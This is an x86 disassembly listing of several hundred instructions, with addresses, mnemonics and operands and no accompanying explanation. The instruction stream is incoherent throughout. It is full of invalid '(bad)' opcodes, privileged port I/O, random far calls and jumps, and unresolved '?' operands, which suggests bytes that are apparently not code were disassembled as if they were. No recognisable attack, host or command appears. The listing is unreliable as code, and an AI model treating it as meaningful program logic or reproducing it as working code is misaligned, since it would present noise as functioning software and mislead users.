  417aec:	push   ds
  417aed:	(bad)  
  417aee:	daa    
  417aef:	stos   BYTE PTR es:[edi],al
  417af0:	push   0x8
  417af2:	mov    dh,0x57
  417af4:	and    eax,0xba54aa0c
  417af9:	hlt    
  417afa:	scas   al,BYTE PTR es:[edi]
  417afb:	inc    esp
  417afc:	iret   
  417afd:	lock xor BYTE PTR [edx],0x9
  417b01:	(bad)  
  417b03:	test   DWORD PTR [esi-0x55],esp
  417b06:	lock pop es
  417b08:	std    
  417b09:	in     al,dx
  417b0a:	jge    0x417b07
  417b0c:	inc    ebx
  417b0d:	retf   
  417b0e:	in     al,dx
  417b0f:	xor    cl,al
  417b11:	into   
  417b12:	sbb    eax,0x29e51e98
  417b17:	js     0x417ab2
  417b19:	mov    bl,0xa6
  417b1b:	push   0x54
  417b1d:	mov    al,0xc5
  417b1f:	jl     0x417acf
  417b21:	xor    DWORD PTR [edi],esp
  417b23:	(bad)  
  417b25:	out    dx,al
  417b26:	and    eax,0xc978b6d2
  417b2b:	inc    esi
  417b2c:	xchg   ah,ch
  417b2e:	in     eax,0x85
  417b30:	push   ebx
  417b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b32:	pop    ebp
  417b33:	fstp   TBYTE PTR [eax-0x37]
  417b36:	and    bl,dl
  417b38:	xchg   esp,eax
  417b39:	push   eax
  417b3a:	dec    ebp
  417b3b:	sub    eax,ebp
  417b3d:	pop    ebp
  417b3e:	sahf   
  417b3f:	mov    esp,0xc358e93e
  417b44:	std    
  417b45:	or     al,BYTE PTR [eax+0x52]
  417b48:	push   ebx
  417b49:	(bad)  
  417b4a:	push   esp
  417b4b:	cwde   
  417b4c:	imul   esi,esp,0x3852769d
  417b52:	fwait
  417b53:	jle    0x417bad
  417b55:	pop    edx
  417b56:	jmp    0x417b7c
  417b58:	mov    ebp,0x4472ff09
  417b5d:	addr16 ret 0x6d17
  417b61:	mov    ds:0x2e547780,eax
  417b66:	fimul  DWORD PTR [esi]
  417b68:	add    BYTE PTR [esi],dl
  417b6a:	inc    edi
  417b6b:	add    esp,ecx
  417b6d:	leave  
  417b6e:	std    
  417b6f:	mov    ds:0x937cb338,al
  417b74:	in     eax,0x56
  417b76:	cld    
  417b77:	pop    edx
  417b78:	cmp    edi,DWORD PTR [ecx]
  417b7a:	popa   
  417b7b:	inc    ebx
  417b7c:	and    eax,0x678eb621
  417b81:	mov    bh,dl
  417b83:	xor    al,0x87
  417b85:	sbb    ecx,ebx
  417b87:	cdq    
  417b88:	hlt    
  417b89:	out    dx,eax
  417b8a:	dec    ebx
  417b8b:	leave  
  417b8c:	sub    ah,BYTE PTR [ecx-0x178c05e5]
  417b92:	adc    edx,DWORD PTR [eax]
  417b94:	cmc    
  417b95:	sub    edi,DWORD PTR ss:[ebp+0x50eb21a3]
  417b9c:	jmp    0xc5e877d9
  417ba1:	inc    eax
  417ba2:	cmp    esi,DWORD PTR [ebx+edx*1+0x77]
  417ba6:	rcl    BYTE PTR [esi+esi*4+0x7b],cl
  417baa:	pop    ebp
  417bab:	cld    
  417bac:	jae    0x417bbc
  417bae:	cdq    
  417baf:	push   esi
  417bb0:	lock jg 0x417b4b
  417bb3:	and    ch,BYTE PTR [ebx]
  417bb5:	aad    0x14
  417bb7:	mov    ds:0x21f6acf1,eax
  417bbc:	std    
  417bbd:	iret   
  417bbe:	ret    
  417bbf:	add    cl,0xe3
  417bc2:	jae    0x417be3
  417bc4:	add    DWORD PTR [esi-0x60],0x33
  417bc8:	lds    esp,FWORD PTR [ebp-0x4659cf05]
  417bce:	int    0xbc
  417bd0:	loope  0x417b69
  417bd2:	loope  0x417b8e
  417bd4:	call   0x333f:0xd902d7b6
  417bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bdc:	mov    DWORD PTR [eax+0x1f04b0e6],edx
  417be2:	mov    cl,0x76
  417be4:	and    eax,0x4a2238ab
  417be9:	xlat   BYTE PTR ds:[ebx]
  417bea:	scas   al,BYTE PTR es:[edi]
  417beb:	aaa    
  417bec:	jg     0x417bc4
  417bee:	jp     0x417be3
  417bf0:	lock (bad) 
  417bf2:	aam    0x34
  417bf4:	xchg   ebp,eax
  417bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bf6:	mov    ebp,0xfed4fe5a
  417bfb:	mov    esi,0xa1eb3a1e
  417c00:	cmp    BYTE PTR [ebx],0xf5
  417c03:	popf   
  417c04:	and    al,0x26
  417c06:	jge    0x417c4e
  417c08:	arpl   WORD PTR [esi+edi*4+0x44b0995e],cx
  417c0f:	mov    ds:0xa0c4af57,eax
  417c14:	popa   
  417c15:	arpl   WORD PTR [edi+0x6d1369f4],bp
  417c1b:	cli    
  417c1c:	and    ebp,ebp
  417c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c1f:	retf   0xe93f
  417c22:	push   0x89228b11
  417c27:	adc    eax,0xbb890f79
  417c2c:	jmp    0xc2c55659
  417c31:	retf   0x4766
  417c34:	cli    
  417c35:	retf   0xa832
  417c38:	stos   DWORD PTR es:[edi],eax
  417c39:	xchg   ebx,eax
  417c3a:	mov    edx,0xc353d649
  417c3f:	retf   
  417c40:	mov    al,ds:0x9c3418c5
  417c45:	dec    ecx
  417c46:	inc    esp
  417c47:	cdq    
  417c48:	hlt    
  417c49:	or     ch,bl
  417c4b:	push   ss
  417c4c:	xchg   ecx,eax
  417c4d:	daa    
  417c4e:	lahf   
  417c4f:	pop    eax
  417c50:	xor    esi,DWORD PTR [edi+0x5a26a37d]
  417c56:	ins    DWORD PTR es:[edi],dx
  417c57:	jmp    DWORD PTR [ebx-0x59feaff3]
  417c5d:	xchg   esi,eax
  417c5e:	jns    0x417c7b
  417c60:	xor    bh,cl
  417c62:	cmc    
  417c63:	leave  
  417c64:	fcom   QWORD PTR ss:[ecx]
  417c67:	pop    ebp
  417c68:	outs   dx,BYTE PTR ds:[esi]
  417c69:	leave  
  417c6a:	xchg   edi,eax
  417c6b:	or     BYTE PTR [ecx],ch
  417c6d:	iret   
  417c6e:	cmp    eax,DWORD PTR [ebx+0x4956c2f8]
  417c74:	fmul   QWORD PTR [eax+edi*1]
  417c77:	add    ch,BYTE PTR [esi]
  417c79:	cmp    esi,eax
  417c7b:	(bad)  
  417c7c:	retf   0x71a9
  417c7f:	test   eax,0x5465ec3b
  417c84:	call   0x8276a358
  417c89:	out    0x8c,eax
  417c8b:	ja     0x417ca6
  417c8d:	sub    al,0x91
  417c8f:	pop    es
  417c90:	add    edi,0xffffffae
  417c93:	cmp    BYTE PTR [edi],cl
  417c95:	mov    dh,BYTE PTR [ebx]
  417c97:	jno    0x417c70
  417c99:	jno    0x417c28
  417c9b:	or     al,ah
  417c9d:	or     al,0xe8
  417c9f:	sahf   
  417ca0:	scas   eax,DWORD PTR es:[di]
  417ca2:	inc    edi
  417ca3:	pop    esi
  417ca4:	mov    ds:0xeb9b6303,eax
  417ca9:	adc    edi,DWORD PTR [edi]
  417cab:	loope  0x417cbf
  417cad:	mov    cl,0x5b
  417caf:	jl     0x417ce5
  417cb1:	and    eax,0x44aacbb4
  417cb6:	pop    esp
  417cb7:	es int 0xef
  417cba:	pop    ebx
  417cbb:	test   DWORD PTR [eax+0x4267c797],ebx
  417cc1:	mov    dl,0x47
  417cc3:	sbb    DWORD PTR [ecx],esi
  417cc5:	ds add bl,ch
  417cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cc9:	xchg   ecx,eax
  417cca:	adc    esp,DWORD PTR cs:[ecx+0x998e7b9]
  417cd1:	call   0xf00d:0x12af09f8
  417cd8:	or     DWORD PTR [edx],ecx
  417cda:	aam    0x64
  417cdc:	out    0x98,al
  417cde:	jmp    0x26b1482f
  417ce3:	outs   dx,DWORD PTR ds:[esi]
  417ce4:	test   eax,0x24644a76
  417ce9:	aam    0x1d
  417ceb:	xchg   edx,eax
  417cec:	jge    0x417d5c
  417cee:	mov    cl,BYTE PTR [esi]
  417cf0:	(bad)  [edx-0x44bd37bf]
  417cf6:	enter  0xdc36,0xa7
  417cfa:	mov    ebx,0x8fa957ea
  417cff:	pop    eax
  417d00:	add    eax,0x98e1e36b
  417d05:	outs   dx,BYTE PTR ds:[esi]
  417d06:	dec    edi
  417d07:	push   ecx
  417d08:	dec    ebx
  417d09:	out    dx,eax
  417d0a:	pop    ebp
  417d0b:	int3   
  417d0c:	sub    dl,dl
  417d0e:	or     DWORD PTR [esi-0x4db63d54],ebx
  417d14:	jp     0x417cb5
  417d16:	fild   WORD PTR [edi+0x31af76d8]
  417d1c:	cmp    BYTE PTR [ebp-0x7e8f2ce7],al
  417d22:	inc    edx
  417d24:	add    DWORD PTR [ebx+0x35741db1],esi
  417d2a:	jns    0x417cb7
  417d2c:	(bad)  
  417d2d:	retf   
  417d2e:	ds (bad) 
  417d30:	push   eax
  417d31:	sbb    esp,0x96df10ff
  417d37:	dec    esp
  417d38:	ins    DWORD PTR es:[edi],dx
  417d39:	mov    ds:0x32745ecc,eax
  417d3e:	repnz (bad) [ebx+0x36]
  417d42:	mov    ds:0x791d5bec,al
  417d47:	int3   
  417d48:	add    BYTE PTR [edi+0x7c],ch
  417d4b:	dec    esp
  417d4c:	leave  
  417d4d:	mov    ecx,0x437326c3
  417d52:	sahf   
  417d53:	adc    ch,BYTE PTR [ebx]
  417d55:	icebp  
  417d56:	sahf   
  417d57:	std    
  417d58:	clc    
  417d59:	rol    BYTE PTR [edi],0xad
  417d5c:	adc    edi,esi
  417d5e:	lahf   
  417d5f:	xchg   edx,eax
  417d60:	stos   DWORD PTR es:[edi],eax
  417d61:	test   eax,0x855f92f7
  417d66:	xor    al,0xf2
  417d68:	test   ah,ch
  417d6a:	xchg   edi,eax
  417d6b:	mov    al,0xd0
  417d6d:	and    ch,al
  417d6f:	or     al,0x10
  417d71:	jl     0x417de4
  417d73:	dec    ecx
  417d74:	ret    0x1b37
  417d77:	aaa    
  417d78:	or     esi,ecx
  417d7a:	mov    ds:0x3b02cf3,al
  417d7f:	scas   al,BYTE PTR es:[edi]
  417d80:	retf   
  417d81:	mov    ah,BYTE PTR [esi]
  417d83:	jg     0x417d7d
  417d85:	adc    BYTE PTR [edx+eax*2-0x70],ch
  417d89:	ins    DWORD PTR es:[edi],dx
  417d8a:	or     bl,BYTE PTR [eax+0xe]
  417d8d:	(bad)
  417d90:	(bad)  [eax-0x2c]
  417d93:	out    dx,eax
  417d94:	fst    st(4)
  417d96:	dec    eax
  417d97:	cmp    bl,BYTE PTR [eax]
  417d99:	pop    esi
  417d9a:	inc    eax
  417d9b:	mov    edx,0xd0ee6ef7
  417da0:	in     eax,dx
  417da1:	fimul  WORD PTR [edi+0x11]
  417da4:	xor    ah,cl
  417da6:	fiadd  WORD PTR [edx]
  417da8:	cdq    
  417da9:	mov    cl,0xfa
  417dab:	pop    ds
  417dac:	clc    
  417dad:	mov    eax,ds:0xefb5f7e8
  417db2:	mov    ebp,DWORD PTR [eax+0x4eb63bc5]
  417db8:	fld    TBYTE PTR [ebx+esi*8-0x5a]
  417dbc:	sbb    eax,DWORD PTR ds:0xb05c3f2
  417dc2:	xchg   ebp,eax
  417dc3:	ja     0x417e14
  417dc5:	xor    eax,0x1c7f76ca
  417dca:	and    al,0x66
  417dcc:	jno    0x417d74
  417dce:	out    0xc5,al
  417dd0:	jne    0x417e24
  417dd2:	adc    BYTE PTR [ebx+eiz*4+0x76d557ab],ah
  417dd9:	add    BYTE PTR [eax],al
  417ddb:	mov    edi,0x2d7d39ff
  417de0:	out    0x4b,al
  417de2:	nop
  417de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de4:	xor    al,0x74
  417de6:	mov    ebp,0x7e429c2d
  417deb:	out    0x23,eax
  417ded:	hlt    
  417dee:	fisubr DWORD PTR [edi+0x78]
  417df1:	fild   QWORD PTR [ebx]
  417df3:	mov    ds:0xa1872e20,al
  417df8:	xchg   BYTE PTR [esi-0xf],ch
  417dfb:	jmp    0x35462570
  417e00:	sbb    ch,0xea
  417e03:	and    BYTE PTR [edi+esi*8+0x21271ae0],cl
  417e0a:	shr    BYTE PTR [esi-0x71],0x5a
  417e0e:	fwait
  417e0f:	in     al,dx
  417e10:	pusha  
  417e11:	popw   ss
  417e13:	mov    bl,0x4
  417e15:	push   ds
  417e16:	jecxz  0x417df8
  417e18:	ficom  DWORD PTR [ecx+0x3502d90f]
  417e1e:	mov    ebp,0x317eaf51
  417e23:	aad    0xd3
  417e25:	sub    ecx,DWORD PTR [edx+0x22]
  417e28:	call   0xf6c:0x362abbe4
  417e2f:	add    al,0x2f
  417e31:	adc    BYTE PTR [edx],ch
  417e33:	bound  esp,QWORD PTR [ebx]
  417e35:	leave  
  417e36:	push   ds
  417e37:	imul   edx,DWORD PTR [edx],0x4a
  417e3a:	shr    BYTE PTR [ebp-0x56aaec62],1
  417e40:	xor    eax,0x35b6ab1d
  417e45:	sub    eax,ebx
  417e47:	sub    ah,bl
  417e49:	dec    ebp
  417e4a:	in     al,dx
  417e4b:	dec    esp
  417e4c:	lods   al,BYTE PTR ds:[esi]
  417e4d:	sti    
  417e4e:	xchg   ecx,eax
  417e4f:	inc    esp
  417e50:	push   ebp
  417e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e52:	add    eax,0xa8b10e28
  417e57:	call   0x2411:0x9ccca463
  417e5e:	sbb    al,0xd
  417e60:	mov    edx,0xa59acd49
  417e65:	and    BYTE PTR [edx+0x7],dh
  417e68:	and    eax,0xa3eb0cf8
  417e6d:	nop
  417e6e:	stos   BYTE PTR es:[edi],al
  417e6f:	fisub  WORD PTR [ecx+0x78]
  417e72:	push   ds
  417e73:	nop
  417e74:	xchg   dh,dh
  417e76:	inc    esp
  417e77:	cmp    eax,0x9a497914
  417e7c:	std    
  417e7d:	push   ebx
  417e7e:	add    eax,0x3339fffe
  417e83:	jne    0x417e31
  417e85:	dec    esi
  417e86:	in     al,0xc0
  417e88:	jecxz  0x417e1a
  417e8a:	and    eax,0x803487ed
  417e8f:	mov    esi,0x1cdf1dde
  417e94:	adc    esp,esi
  417e96:	pop    ecx
  417e97:	mov    ds:0x7cb7a555,al
  417e9c:	jmp    0x67db:0x1ce5c8d3
  417ea3:	(bad)  
  417ea4:	and    esp,DWORD PTR [esi-0x17]
  417ea7:	jge    0x417f21
  417ea9:	sbb    DWORD PTR ds:0x9bb7db42,edi
  417eaf:	sub    BYTE PTR [edx+ecx*1+0x36],cl
  417eb3:	shr    BYTE PTR es:[edx],1
  417eb6:	mov    bh,0xdf
  417eb8:	mov    edx,0xa45b50ff
  417ebe:	sar    DWORD PTR [esp+eax*2+0x47451d92],0x9f
  417ec6:	dec    ecx
  417ec7:	imul   ecx,DWORD PTR [edx+0x5adb7721],0x26
  417ece:	or     ah,ch
  417ed0:	popf   
  417ed1:	loope  0x417e81
  417ed3:	and    DWORD PTR [ebx],0x3c
  417ed6:	in     eax,dx
  417ed7:	cwde   
  417ed8:	test   DWORD PTR [ecx],edi
  417eda:	xchg   ecx,eax
  417edb:	stos   DWORD PTR es:[edi],eax
  417edc:	imul   esp,DWORD PTR [edx-0x4f],0x60
  417ee0:	out    0x4e,eax
  417ee2:	mov    bh,0x3e
  417ee4:	jecxz  0x417f10
  417ee6:	mov    WORD PTR [edx-0x19],cs
  417ee9:	pusha  
  417eea:	and    DWORD PTR [ebx-0x6e],edi
  417eed:	mov    ebp,0x31a2e0f3
  417ef2:	push   ebx
  417ef3:	out    0xe6,al
  417ef5:	addr16 jno 0x417efc
  417ef8:	cli    
  417ef9:	xlat   BYTE PTR ds:[ebx]
  417efa:	push   0x5c9c58e3
  417eff:	je     0x417e86
  417f01:	mov    al,ds:0xd12d7cc9
  417f06:	pop    es
  417f07:	push   es
  417f08:	fmul   QWORD PTR [esi+0x49]
  417f0b:	push   edi
  417f0c:	xchg   edi,eax
  417f0d:	pop    esp
  417f0e:	fs adc al,dl
  417f11:	loop   0x417f4a
  417f13:	daa    
  417f14:	aaa    
  417f15:	cmc    
  417f16:	jmp    0x417ee0
  417f18:	add    DWORD PTR [edx+ebx*1-0x295dd7d3],ecx
  417f1f:	repz imul ebx,esi,0x18
  417f23:	xchg   edx,eax
  417f24:	xor    eax,0x7cbc3839
  417f29:	xchg   edx,eax
  417f2a:	xchg   ebx,eax
  417f2b:	(bad)  
  417f2c:	call   0x4f0dc23d
  417f31:	xchg   BYTE PTR [eax],bl
  417f33:	xor    DWORD PTR [edi],eax
  417f35:	xchg   edi,esp
  417f37:	push   ds
  417f38:	and    eax,0xf46e8711
  417f3d:	cwde   
  417f3e:	sbb    BYTE PTR [ebp-0x5e],dl
  417f41:	mov    esi,0xfd25d2a6
  417f46:	shl    BYTE PTR [edi-0x62fdef96],0x15
  417f4d:	sbb    eax,0x236a34d4
  417f52:	in     eax,dx
  417f53:	mov    ds:0xd077b59,eax
  417f58:	sti    
  417f59:	or     DWORD PTR [esi+0x3ce6045c],esp
  417f5f:	aad    0xd9
  417f61:	xchg   ebx,eax
  417f62:	out    0x87,eax
  417f64:	aam    0xb4
  417f66:	inc    ebx
  417f67:	sbb    al,0x7b
  417f69:	shl    cl,cl
  417f6b:	mov    ebp,DWORD PTR [ecx+0x196cd06e]
  417f71:	or     DWORD PTR [ebp+0x4a9af7b0],esp
  417f77:	pushf  
  417f78:	push   0x26
  417f7a:	popa   
  417f7b:	push   ebp
  417f7c:	gs dec ecx
  417f7e:	ins    DWORD PTR es:[edi],dx
  417f7f:	xor    BYTE PTR [ebx+0xabb88bf],ah
  417f85:	shl    DWORD PTR [ebx-0x5c],1
  417f88:	push   edi
  417f89:	retf   0x8c76
  417f8c:	push   ss
  417f8d:	jae    0x417f95
  417f8f:	mov    eax,ds:0x445dcdbc
  417f94:	mov    DWORD PTR [eax+eiz*2+0x72f4490a],esi
  417f9b:	popa   
  417f9c:	cmp    dl,BYTE PTR [edx-0x63]
  417f9f:	xchg   ebp,eax
  417fa0:	push   ebx
  417fa1:	lods   al,BYTE PTR ds:[esi]
  417fa2:	loopne 0x41800d
  417fa4:	inc    esi
  417fa5:	mov    al,BYTE PTR [esi-0x4a]
  417fa8:	push   ss
  417fa9:	adc    BYTE PTR [esi-0x68],dl
  417fac:	aam    0xeb
  417fae:	(bad)
  417fb3:	jl     0x417f8e
  417fb5:	jecxz  0x417f54
  417fb7:	rcr    BYTE PTR [edi+0x21],cl
  417fba:	mov    edx,0x539b852
  417fbf:	cdq    
  417fc0:	(bad)  
  417fc1:	movmskps eax,xmm6
  417fc4:	scas   al,BYTE PTR es:[edi]
  417fc5:	int    0x15
  417fc7:	sub    al,0x1f
  417fc9:	dec    esp
  417fca:	push   es
  417fcb:	cld    
  417fcc:	das    
  417fcd:	call   0xf4a3777b
  417fd2:	test   al,0x96
  417fd4:	js     0x417ff0
  417fd6:	add    al,0xb
  417fd8:	es xchg ebx,eax
  417fda:	sub    BYTE PTR [edx+0x77],bh
  417fdd:	pusha  
  417fde:	pop    es
  417fdf:	sbb    eax,0x6ca81e2c
  417fe4:	or     DWORD PTR [esi+0x689e6764],0x2fb25157
  417fee:	out    0x1a,al
  417ff0:	inc    ecx
  417ff1:	dec    eax
  417ff2:	xchg   esp,eax
  417ff3:	and    BYTE PTR [ebp-0x355d5d70],bh
  417ff9:	lahf   
  417ffa:	cmp    cl,bh
  417ffc:	(bad)  
  417ffd:	fadd   QWORD PTR [edx-0x17]
  418000:	mov    ?,WORD PTR ds:0x515f2e69
  418006:	jo     0x418016
  418008:	xor    dl,bl
  41800a:	and    al,0x82
  41800c:	loopne 0x418008
  41800e:	cmp    al,0x1
  418010:	pop    ecx
  418011:	cwde   
  418012:	push   edx
  418013:	ins    DWORD PTR es:[edi],dx
  418014:	fmulp  st(5),st
  418016:	ret    
  418017:	iret   
  418018:	pop    ss
  418019:	add    DWORD PTR [ebp-0x4d],0x230e3ff6
  418020:	inc    ecx
  418021:	pop    ss
  418022:	sbb    al,0x7
  418024:	mov    ecx,0x46bec471
  418029:	inc    edi
  41802a:	and    dh,BYTE PTR [edi]
  41802c:	(bad)  
  41802d:	test   eax,0x554d3da
  418032:	add    ebx,DWORD PTR [ecx-0x503b0321]
  418038:	jmp    FWORD PTR [edx]
  41803a:	out    dx,al
  41803b:	push   es
  41803c:	mov    ebx,0x2ac109fd
  418041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418042:	lods   al,BYTE PTR ds:[esi]
  418043:	pop    esi
  418044:	out    dx,al
  418045:	popa   
  418046:	cmp    cl,al
  418048:	(bad)  
  418049:	jmp    0xcfb4:0x71e93104
  418050:	add    DWORD PTR [eax-0x6b68fa2a],eax
  418056:	push   ss
  418057:	xor    al,0x17
  418059:	lea    edi,[esi]
  41805b:	(bad)  
  41805d:	ret    0xf9d3
  418060:	and    eax,0x361b7859
  418065:	sub    ebp,ebp
  418067:	lock mov eax,ds:0x28ae2c51
  41806d:	cmp    dl,bh
  41806f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418071:	add    ebx,DWORD PTR [ebp-0x2ab8319]
  418077:	pop    ebp
  418078:	mov    edi,0xd56cf677
  41807d:	js     0x418081
  41807f:	int3   
  418080:	xchg   esi,eax
  418081:	ret    
  418082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418083:	aaa    
  418084:	adc    edi,ebp
  418086:	stos   DWORD PTR es:[edi],eax
  418087:	and    al,0x94
  418089:	adc    DWORD PTR [esi+0x35],0x5d412ff
  418090:	mov    DWORD PTR [edi-0x4],ebx
  418093:	dec    eax
  418094:	out    0xce,al
  418096:	js     0x418051
  418098:	pop    es
  418099:	push   eax
  41809a:	js     0x41802e
  41809c:	add    eax,0xae945ddf
  4180a1:	call   0xe73f:0x48601592
  4180a8:	mov    DWORD PTR [esi],ecx
  4180aa:	dec    ebx
  4180ab:	aas    
  4180ac:	into   
  4180ad:	jge    0x418111
  4180af:	mov    esp,0x8e3ff5a7
  4180b4:	or     ah,BYTE PTR [esi]
  4180b6:	cmp    eax,0xf3824145
  4180bb:	sar    BYTE PTR [eax+0x3e1f62c9],0x5b
  4180c2:	std    
  4180c3:	test   DWORD PTR [ecx-0x18],ebx
  4180c6:	das    
  4180c7:	mov    dl,0xef
  4180c9:	sahf   
  4180ca:	dec    esi
  4180cb:	xor    bl,cl
  4180cd:	js     0x4180cb
  4180cf:	int    0x6c
  4180d1:	add    eax,0x790b4fe5
  4180d6:	and    BYTE PTR [edx+0x6fdf14f1],bh
  4180dc:	ins    DWORD PTR es:[edi],dx
  4180dd:	add    esp,edx
  4180df:	and    BYTE PTR [esi+0x1],bl
  4180e2:	mov    dl,0xc8
  4180e4:	dec    edx
  4180e5:	xchg   esi,eax
  4180e6:	mov    ah,0xb0
  4180e8:	rol    DWORD PTR [esi-0x1f],0x4
  4180ec:	imul   ecx,DWORD PTR cs:[ebx+ebx*1],0xffffff85
  4180f1:	mov    esp,0xf5d27ca3
  4180f6:	sub    bh,BYTE PTR [ecx+edx*2-0x13]
  4180fa:	stos   BYTE PTR es:[edi],al
  4180fb:	xor    BYTE PTR [esi+edi*4+0x17],bl
  4180ff:	rcl    eax,1
  418101:	pop    ds
  418102:	pop    esi
  418103:	rcl    BYTE PTR [eax],1
  418105:	cdq    
  418106:	outs   dx,BYTE PTR ds:[esi]
  418107:	or     eax,0x66e532fd
  41810c:	xor    al,0xcc
  41810e:	fwait
  41810f:	jne    0x418102
  418111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418112:	ret    0x7720
  418115:	adc    BYTE PTR [ebx+0xf0c6fec],bl
  41811b:	scas   eax,DWORD PTR es:[edi]
  41811c:	(bad)  
  41811d:	jecxz  0x4180ea
  41811f:	stc    
  418120:	dec    ecx
  418121:	rcr    DWORD PTR ds:0xb277f886,0xb1
  418128:	pop    ecx
  418129:	loope  0x418162
  41812b:	mov    WORD PTR [ecx+eax*4],?
  41812e:	in     al,dx
  41812f:	rcr    BYTE PTR [edi],1
  418131:	lock sahf 
  418133:	jo     0x41813b
  418135:	xor    al,dl
  418137:	out    0xf,al
  418139:	outs   dx,DWORD PTR ds:[esi]
  41813a:	adc    ah,BYTE PTR [edi]
  41813c:	mov    ecx,0x5ef08777
  418141:	pop    ebx
  418142:	imul   esi
  418144:	iret   
  418145:	out    dx,eax
  418146:	call   0x953ece80
  41814b:	ds jle 0x41810f
  41814e:	cwde   
  41814f:	or     eax,0xa72d4c3a
  418154:	lods   eax,DWORD PTR ds:[esi]
  418155:	loope  0x418132
  418157:	xor    DWORD PTR [eax],eax
  418159:	sub    esp,DWORD PTR [ebp+0x36]
  41815c:	push   0xffffffc3
  41815e:	lods   eax,DWORD PTR ds:[esi]
  41815f:	push   ebp
  418160:	sub    cl,BYTE PTR [edx]
  418162:	out    dx,al
  418163:	or     al,0x6a
  418165:	fnstcw WORD PTR ds:0xd4539201
  41816b:	rol    DWORD PTR [edx+0x44],cl
  41816e:	dec    esp
  41816f:	pop    edx
  418170:	xchg   BYTE PTR [ebx+0x78],bh
  418173:	cmp    DWORD PTR [ecx+0x53],ebx
  418176:	fs mov ecx,0xa50754dc
  41817c:	inc    eax
  41817d:	push   cs
  41817e:	cdq    
  41817f:	addr16 jmp 0x4f3f78c5
  418185:	xchg   ebx,eax
  418186:	mov    ecx,0x469f02e5
  41818b:	sbb    al,0xdc
  41818d:	mov    ds:0x88d83be0,eax
  418192:	ret    
  418193:	mov    ?,ebp
  418195:	xchg   edi,eax
  418196:	xchg   edx,eax
  418197:	sahf   
  418198:	cmp    eax,0xe4b7643d
  41819d:	add    edx,DWORD PTR [ecx]
  41819f:	ficomp WORD PTR [ecx+0x8f93232]
  4181a5:	nop    esi
  4181a8:	cmp    DWORD PTR [esi+0x6ce5252f],ebx
  4181ae:	mov    bh,0xbf
  4181b0:	mov    eax,0x8a01c46a
  4181b5:	push   edi
  4181b6:	push   0xffffffda
  4181b8:	jns    0x41821e
  4181ba:	add    DWORD PTR [esp+eiz*8],esp
  4181bd:	push   esp
  4181be:	mov    ds:0xe6786e49,eax
  4181c3:	xor    dl,0x80
  4181c6:	mov    dl,0x35
  4181c8:	push   edi
  4181c9:	in     eax,0xd1
  4181cb:	jmp    FWORD PTR [edx+0x7e]
  4181ce:	in     al,0xed
  4181d0:	pop    esp
  4181d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181d2:	(bad)  
  4181d3:	int    0x59
  4181d5:	pop    edi
  4181d6:	mov    ds:0xa655e58e,al
  4181db:	pop    ebx
  4181dc:	pop    ebx
  4181dd:	icebp  
  4181de:	pop    ebx
  4181df:	mov    DWORD PTR [ebp-0x30],ebx
  4181e2:	push   cs
  4181e3:	das    
  4181e4:	mov    eax,ds:0x3439d5cd
  4181e9:	mov    esi,0x48e4ffc8
  4181ee:	cvtpi2ps xmm5,QWORD PTR [ebx-0x7d9fb540]
  4181f5:	stc    
  4181f6:	pushf  
  4181f7:	and    eax,0xd2147f5a
  4181fc:	std    
  4181fd:	shl    BYTE PTR [ebp+0x4c18fa5f],0xc0
  418204:	aam    0x29
  418206:	stos   BYTE PTR es:[edi],al
  418207:	xchg   ebx,eax
  418208:	in     al,0x57
  41820a:	mov    ebx,0xc3c96421
  41820f:	mov    bl,0xd0
  418211:	sti    
  418212:	jp     0x418269
  418214:	mov    al,ds:0x6d6e641b
  418219:	mov    al,0x3f
  41821b:	mov    al,0x3a
  41821d:	retf   
  41821e:	mov    ah,0x5f
  418220:	and    dl,ch
  418222:	cmp    eax,0x1cc9963d
  418227:	push   ss
  418228:	pop    esi
  418229:	xchg   edx,eax
  41822a:	into   
  41822b:	lods   al,BYTE PTR ds:[esi]
  41822c:	or     bl,BYTE PTR [ebp+0x46]
  41822f:	pop    esi
  418230:	repnz fidivr DWORD PTR [edx+0x328564b8]
  418237:	sbb    ah,BYTE PTR [esi]
  418239:	aam    0xcb
  41823b:	imul   eax,edx,0xa
  41823e:	jp     0x41822e
  418240:	or     esp,0x6c1778b0
  418246:	inc    esp
  418247:	add    ebp,DWORD PTR [edi-0x32d35fcd]
  41824d:	je     0x41826b
  41824f:	mov    ?,ebp
  418251:	shr    BYTE PTR [edi-0x6d],0x6f
  418255:	pop    ecx
  418256:	push   ds
  418257:	push   ebx
  418258:	push   ss
  418259:	enter  0xbb4c,0x9
  41825d:	jl     0x4182b9
  41825f:	mov    al,0x4c
  418261:	push   edx
  418262:	mov    ch,0xa3
  418264:	in     al,dx
  418265:	mov    ds,WORD PTR [eax+ebx*4-0x26]
  418269:	int    0x5b
  41826b:	aad    0xca
  41826d:	push   ebp
  41826e:	lea    esi,[ecx]
  418270:	inc    ecx
  418271:	push   ecx
  418272:	daa    
  418273:	outs   dx,DWORD PTR ds:[esi]
  418274:	dec    edi
  418275:	fadd   st,st(3)
  418277:	cmp    BYTE PTR [ebx],ah
  418279:	(bad)  [ebp-0x49]
  41827c:	sub    al,0x1d
  41827e:	mov    BYTE PTR [edx-0x15],ch
  418281:	sbb    ch,al
  418283:	mov    bh,0x81
  418285:	jp     0x4182ac
  418287:	clc    
  418288:	loope  0x4182e6
  41828a:	mov    eax,0x57f0348e
  41828f:	(bad)  
  418291:	or     DWORD PTR [ebp-0x1c7bc519],ebp
  418297:	add    al,0xc7
  418299:	push   cs
  41829a:	mov    eax,0x355d1297
  41829f:	lock dec edx
  4182a1:	rcr    BYTE PTR [ebp+0x7b],cl
  4182a4:	retf   0x7012
  4182a7:	pop    ds
  4182a8:	clc    
  4182a9:	cmp    eax,ecx
  4182ab:	xor    BYTE PTR [ebp-0x161efad2],ah
  4182b1:	jp     0x418294
  4182b3:	pop    es
  4182b4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
